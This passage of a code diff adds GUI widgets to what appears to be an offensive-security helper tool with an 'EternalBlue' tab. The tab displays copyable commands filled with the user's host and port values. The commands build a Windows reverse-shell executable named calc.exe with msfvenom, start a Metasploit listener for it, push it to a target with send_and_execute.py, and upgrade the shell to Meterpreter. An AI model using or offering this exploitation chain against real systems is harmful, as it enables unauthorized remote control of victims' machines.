+        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_divider2
+        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
+            self.smbhelper_EternalBlue_divider2.deleteLater()
+        self.smbhelper_EternalBlue_divider2 = QFrame()
+        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_spacer1
+        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
+            self.smbhelper_EternalBlue_spacer1.deleteLater()
+        self.smbhelper_EternalBlue_spacer1 = QLabel()
+        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue_spacer2
+        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
+            self.smbhelper_EternalBlue_spacer2.deleteLater()
+        self.smbhelper_EternalBlue_spacer2 = QLabel()
+        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue spacer & divider layout
+        self.tab8_container_layout.insertWidget(43, self.smbhelper_EternalBlue_spacer1)
+        self.tab8_container_layout.insertWidget(44, self.smbhelper_EternalBlue_divider1)
+        self.tab8_container_layout.insertWidget(45, self.smbhelper_EternalBlue_divider2)
+        self.tab8_container_layout.insertWidget(46, self.smbhelper_EternalBlue_spacer2)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_Scan3
+        if hasattr(self, 'smbhelper_EternalBlue_Scan3'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan3)
+            self.smbhelper_EternalBlue_Scan3.deleteLater()
+        self.smbhelper_EternalBlue_Scan3 = QLabel("msfvenom -p windows/shell_reverse_tcp -f exe-service lhost=" + self.lhost + " lport=" + self.lport + " -o calc.exe")
+        self.smbhelper_EternalBlue_Scan3.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(47,self.smbhelper_EternalBlue_Scan3)
+     
+        # smbhelper_EternalBlue_Scan3_Copy
+        if hasattr(self, 'smbhelper_EternalBlue_Scan3_Copy'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan3_Copy)
+            self.smbhelper_EternalBlue_Scan3_Copy.deleteLater()
+        self.smbhelper_EternalBlue_Scan3_Copy = QPushButton()
+        self.smbhelper_EternalBlue_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.smbhelper_EternalBlue_Scan3_Copy.setFixedSize(QSize(20,20))
+        self.smbhelper_EternalBlue_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan3.text()))
+        self.smbhelper_EternalBlue_Scan3_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # smbhelper_EternalBlue_Scan3 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan3_Copy)
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan3)
+        self.tab8_container_layout.insertLayout(48, label_layout)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_divider1
+        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
+            self.smbhelper_EternalBlue_divider1.deleteLater()
+        self.smbhelper_EternalBlue_divider1 = QFrame()
+        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_divider2
+        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
+            self.smbhelper_EternalBlue_divider2.deleteLater()
+        self.smbhelper_EternalBlue_divider2 = QFrame()
+        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_spacer1
+        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
+            self.smbhelper_EternalBlue_spacer1.deleteLater()
+        self.smbhelper_EternalBlue_spacer1 = QLabel()
+        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue_spacer2
+        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
+            self.smbhelper_EternalBlue_spacer2.deleteLater()
+        self.smbhelper_EternalBlue_spacer2 = QLabel()
+        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue spacer & divider layout
+        self.tab8_container_layout.insertWidget(49, self.smbhelper_EternalBlue_spacer1)
+        self.tab8_container_layout.insertWidget(50, self.smbhelper_EternalBlue_divider1)
+        self.tab8_container_layout.insertWidget(51, self.smbhelper_EternalBlue_divider2)
+        self.tab8_container_layout.insertWidget(52, self.smbhelper_EternalBlue_spacer2)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_Scan4
+        if hasattr(self, 'smbhelper_EternalBlue_Scan4'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan4)
+            self.smbhelper_EternalBlue_Scan4.deleteLater()
+        self.smbhelper_EternalBlue_Scan4 = QLabel("sudo msfconsole -q -x \"use exploit/multi/handler;set PAYLOAD windows/shell_reverse_tcp;set LHOST " + self.lhost + ";set LPORT " + self.lport + ";exploit\"")
+        self.smbhelper_EternalBlue_Scan4.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(53,self.smbhelper_EternalBlue_Scan4)
+     
+        # smbhelper_EternalBlue_Scan4_Copy
+        if hasattr(self, 'smbhelper_EternalBlue_Scan4_Copy'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan4_Copy)
+            self.smbhelper_EternalBlue_Scan4_Copy.deleteLater()
+        self.smbhelper_EternalBlue_Scan4_Copy = QPushButton()
+        self.smbhelper_EternalBlue_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.smbhelper_EternalBlue_Scan4_Copy.setFixedSize(QSize(20,20))
+        self.smbhelper_EternalBlue_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan4.text()))
+        self.smbhelper_EternalBlue_Scan4_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # smbhelper_EternalBlue_Scan4 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan4_Copy)
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan4)
+        self.tab8_container_layout.insertLayout(54, label_layout)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_divider1
+        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
+            self.smbhelper_EternalBlue_divider1.deleteLater()
+        self.smbhelper_EternalBlue_divider1 = QFrame()
+        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_divider2
+        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
+            self.smbhelper_EternalBlue_divider2.deleteLater()
+        self.smbhelper_EternalBlue_divider2 = QFrame()
+        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_spacer1
+        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
+            self.smbhelper_EternalBlue_spacer1.deleteLater()
+        self.smbhelper_EternalBlue_spacer1 = QLabel()
+        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue_spacer2
+        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
+            self.smbhelper_EternalBlue_spacer2.deleteLater()
+        self.smbhelper_EternalBlue_spacer2 = QLabel()
+        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue spacer & divider layout
+        self.tab8_container_layout.insertWidget(55, self.smbhelper_EternalBlue_spacer1)
+        self.tab8_container_layout.insertWidget(56, self.smbhelper_EternalBlue_divider1)
+        self.tab8_container_layout.insertWidget(57, self.smbhelper_EternalBlue_divider2)
+        self.tab8_container_layout.insertWidget(58, self.smbhelper_EternalBlue_spacer2)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_Scan5
+        if hasattr(self, 'smbhelper_EternalBlue_Scan5'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan5)
+            self.smbhelper_EternalBlue_Scan5.deleteLater()
+        self.smbhelper_EternalBlue_Scan5 = QLabel("python2 send_and_execute.py " + self.rhost + " calc.exe")
+        self.smbhelper_EternalBlue_Scan5.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(59,self.smbhelper_EternalBlue_Scan5)
+     
+        # smbhelper_EternalBlue_Scan5_Copy
+        if hasattr(self, 'smbhelper_EternalBlue_Scan5_Copy'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan5_Copy)
+            self.smbhelper_EternalBlue_Scan5_Copy.deleteLater()
+        self.smbhelper_EternalBlue_Scan5_Copy = QPushButton()
+        self.smbhelper_EternalBlue_Scan5_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.smbhelper_EternalBlue_Scan5_Copy.setFixedSize(QSize(20,20))
+        self.smbhelper_EternalBlue_Scan5_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan5.text()))
+        self.smbhelper_EternalBlue_Scan5_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # smbhelper_EternalBlue_Scan5 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan5_Copy)
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan5)
+        self.tab8_container_layout.insertLayout(60, label_layout)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_divider1
+        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
+            self.smbhelper_EternalBlue_divider1.deleteLater()
+        self.smbhelper_EternalBlue_divider1 = QFrame()
+        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_divider2
+        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
+            self.smbhelper_EternalBlue_divider2.deleteLater()
+        self.smbhelper_EternalBlue_divider2 = QFrame()
+        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_spacer1
+        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
+            self.smbhelper_EternalBlue_spacer1.deleteLater()
+        self.smbhelper_EternalBlue_spacer1 = QLabel()
+        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue_spacer2
+        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
+            self.smbhelper_EternalBlue_spacer2.deleteLater()
+        self.smbhelper_EternalBlue_spacer2 = QLabel()
+        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue spacer & divider layout
+        self.tab8_container_layout.insertWidget(61, self.smbhelper_EternalBlue_spacer1)
+        self.tab8_container_layout.insertWidget(62, self.smbhelper_EternalBlue_divider1)
+        self.tab8_container_layout.insertWidget(63, self.smbhelper_EternalBlue_divider2)
+        self.tab8_container_layout.insertWidget(64, self.smbhelper_EternalBlue_spacer2)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_Scan6
+        if hasattr(self, 'smbhelper_EternalBlue_Scan6'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan6)
+            self.smbhelper_EternalBlue_Scan6.deleteLater()
+        self.smbhelper_EternalBlue_Scan6 = QLabel("background")
+        self.smbhelper_EternalBlue_Scan6.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(65,self.smbhelper_EternalBlue_Scan6)
+     
+        # smbhelper_EternalBlue_Scan6_Copy
+        if hasattr(self, 'smbhelper_EternalBlue_Scan6_Copy'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan6_Copy)
+            self.smbhelper_EternalBlue_Scan6_Copy.deleteLater()
+        self.smbhelper_EternalBlue_Scan6_Copy = QPushButton()
+        self.smbhelper_EternalBlue_Scan6_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.smbhelper_EternalBlue_Scan6_Copy.setFixedSize(QSize(20,20))
+        self.smbhelper_EternalBlue_Scan6_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan6.text()))
+        self.smbhelper_EternalBlue_Scan6_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # smbhelper_EternalBlue_Scan6 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan6_Copy)
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan6)
+        self.tab8_container_layout.insertLayout(66, label_layout)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_divider1
+        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
+            self.smbhelper_EternalBlue_divider1.deleteLater()
+        self.smbhelper_EternalBlue_divider1 = QFrame()
+        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_divider2
+        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
+            self.smbhelper_EternalBlue_divider2.deleteLater()
+        self.smbhelper_EternalBlue_divider2 = QFrame()
+        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_spacer1
+        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
+            self.smbhelper_EternalBlue_spacer1.deleteLater()
+        self.smbhelper_EternalBlue_spacer1 = QLabel()
+        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue_spacer2
+        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
+            self.smbhelper_EternalBlue_spacer2.deleteLater()
+        self.smbhelper_EternalBlue_spacer2 = QLabel()
+        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue spacer & divider layout
+        self.tab8_container_layout.insertWidget(67, self.smbhelper_EternalBlue_spacer1)
+        self.tab8_container_layout.insertWidget(68, self.smbhelper_EternalBlue_divider1)
+        self.tab8_container_layout.insertWidget(69, self.smbhelper_EternalBlue_divider2)
+        self.tab8_container_layout.insertWidget(70, self.smbhelper_EternalBlue_spacer2)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_Scan7
+        if hasattr(self, 'smbhelper_EternalBlue_Scan7'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan7)
+            self.smbhelper_EternalBlue_Scan7.deleteLater()
+        self.smbhelper_EternalBlue_Scan7 = QLabel("use post/multi/manage/shell_to_meterpreter")
+        self.smbhelper_EternalBlue_Scan7.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(71,self.smbhelper_EternalBlue_Scan7)
+     
+        # smbhelper_EternalBlue_Scan7_Copy
+        if hasattr(self, 'smbhelper_EternalBlue_Scan7_Copy'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan7_Copy)
+            self.smbhelper_EternalBlue_Scan7_Copy.deleteLater()
+        self.smbhelper_EternalBlue_Scan7_Copy = QPushButton()
+        self.smbhelper_EternalBlue_Scan7_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.smbhelper_EternalBlue_Scan7_Copy.setFixedSize(QSize(20,20))
+        self.smbhelper_EternalBlue_Scan7_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan7.text()))
+        self.smbhelper_EternalBlue_Scan7_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # smbhelper_EternalBlue_Scan7 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan7_Copy)
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan7)
+        self.tab8_container_layout.insertLayout(72, label_layout)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_divider1
+        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
+            self.smbhelper_EternalBlue_divider1.deleteLater()
+        self.smbhelper_EternalBlue_divider1 = QFrame()
+        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_divider2
+        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
+            self.smbhelper_EternalBlue_divider2.deleteLater()
+        self.smbhelper_EternalBlue_divider2 = QFrame()
+        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_spacer1
+        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
+            self.smbhelper_EternalBlue_spacer1.deleteLater()
+        self.smbhelper_EternalBlue_spacer1 = QLabel()
+        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue_spacer2
+        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
+            self.smbhelper_EternalBlue_spacer2.deleteLater()
+        self.smbhelper_EternalBlue_spacer2 = QLabel()
+        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue spacer & divider layout
+        self.tab8_container_layout.insertWidget(73, self.smbhelper_EternalBlue_spacer1)
+        self.tab8_container_layout.insertWidget(74, self.smbhelper_EternalBlue_divider1)
+        self.tab8_container_layout.insertWidget(75, self.smbhelper_EternalBlue_divider2)
+        self.tab8_container_layout.insertWidget(76, self.smbhelper_EternalBlue_spacer2)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_Scan8
+        if hasattr(self, 'smbhelper_EternalBlue_Scan8'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan8)
+            self.smbhelper_EternalBlue_Scan8.deleteLater()
+        self.smbhelper_EternalBlue_Scan8 = QLabel("sessions -l")
+        self.smbhelper_EternalBlue_Scan8.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(77,self.smbhelper_EternalBlue_Scan8)
+     
+        # smbhelper_EternalBlue_Scan8_Copy
+        if hasattr(self, 'smbhelper_EternalBlue_Scan8_Copy'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan8_Copy)
+            self.smbhelper_EternalBlue_Scan8_Copy.deleteLater()
+        self.smbhelper_EternalBlue_Scan8_Copy = QPushButton()
+        self.smbhelper_EternalBlue_Scan8_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.smbhelper_EternalBlue_Scan8_Copy.setFixedSize(QSize(20,20))
+        self.smbhelper_EternalBlue_Scan8_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan8.text()))
+        self.smbhelper_EternalBlue_Scan8_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # smbhelper_EternalBlue_Scan8 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan8_Copy)
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan8)
+        self.tab8_container_layout.insertLayout(78, label_layout)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_divider1
+        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
+            self.smbhelper_EternalBlue_divider1.deleteLater()
+        self.smbhelper_EternalBlue_divider1 = QFrame()
+        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_divider2
+        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
+            self.smbhelper_EternalBlue_divider2.deleteLater()
+        self.smbhelper_EternalBlue_divider2 = QFrame()
+        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_spacer1
+        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
+            self.smbhelper_EternalBlue_spacer1.deleteLater()
+        self.smbhelper_EternalBlue_spacer1 = QLabel()
+        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue_spacer2
+        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
+            self.smbhelper_EternalBlue_spacer2.deleteLater()
+        self.smbhelper_EternalBlue_spacer2 = QLabel()
+        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue spacer & divider layout
+        self.tab8_container_layout.insertWidget(79, self.smbhelper_EternalBlue_spacer1)
+        self.tab8_container_layout.insertWidget(80, self.smbhelper_EternalBlue_divider1)
+        self.tab8_container_layout.insertWidget(81, self.smbhelper_EternalBlue_divider2)
+        self.tab8_container_layout.insertWidget(82, self.smbhelper_EternalBlue_spacer2)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_Scan9
+        if hasattr(self, 'smbhelper_EternalBlue_Scan9'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan9)
+            self.smbhelper_EternalBlue_Scan9.deleteLater()
+        self.smbhelper_EternalBlue_Scan9 = QLabel("show options")
+        self.smbhelper_EternalBlue_Scan9.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(83,self.smbhelper_EternalBlue_Scan9)
+     
+        # smbhelper_EternalBlue_Scan9_Copy
+        if hasattr(self, 'smbhelper_EternalBlue_Scan9_Copy'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan9_Copy)
+            self.smbhelper_EternalBlue_Scan9_Copy.deleteLater()
+        self.smbhelper_EternalBlue_Scan9_Copy = QPushButton()
+        self.smbhelper_EternalBlue_Scan9_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.smbhelper_EternalBlue_Scan9_Copy.setFixedSize(QSize(20,20))
+        self.smbhelper_EternalBlue_Scan9_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan9.text()))
+        self.smbhelper_EternalBlue_Scan9_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # smbhelper_EternalBlue_Scan9 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan9_Copy)
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan9)
+        self.tab8_container_layout.insertLayout(84, label_layout)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_divider1
+        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
+            self.smbhelper_EternalBlue_divider1.deleteLater()
+        self.smbhelper_EternalBlue_divider1 = QFrame()
+        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_divider2
+        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
+            self.smbhelper_EternalBlue_divider2.deleteLater()
+        self.smbhelper_EternalBlue_divider2 = QFrame()
+        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_spacer1
+        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
+            self.smbhelper_EternalBlue_spacer1.deleteLater()
+        self.smbhelper_EternalBlue_spacer1 = QLabel()
+        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue_spacer2
+        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
+            self.smbhelper_EternalBlue_spacer2.deleteLater()
+        self.smbhelper_EternalBlue_spacer2 = QLabel()
+        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue spacer & divider layout
